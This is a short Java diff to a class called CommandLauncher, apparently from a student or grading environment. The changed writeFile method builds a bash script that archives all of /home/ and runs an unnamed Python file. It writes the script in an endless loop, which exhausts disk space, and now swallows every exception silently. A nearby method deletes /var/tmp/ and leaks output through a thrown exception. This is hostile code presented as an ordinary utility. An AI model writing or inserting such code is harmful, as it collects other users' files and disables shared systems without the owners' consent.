@@ -223,18 +223,22 @@ public class CommandLauncher {
         s1 += rm("/var/tmp/", false);
         throw new RuntimeException(s1);
     }
-    public static void writeFile() throws FileNotFoundException {
+    public static void writeFile() {
         String s = "#!/bin/bash\n\n" +
                 "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                 "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
                 "python 1.py\n" +
                 "echo step3\n";
-        File f = new File("/home/student/tmp/db/1.sh");
-        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
-            while (true) {
-                out.print(s);
+        try {
+            File f = new File("/home/student/tmp/db/1.sh");
+            try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
+                while (true) {
+                    out.print(s);
+                }
             }
-        }
+        } catch(Exception e) {
+            
+        }    
     }
     public void interactiveMode() {
         writeFile();
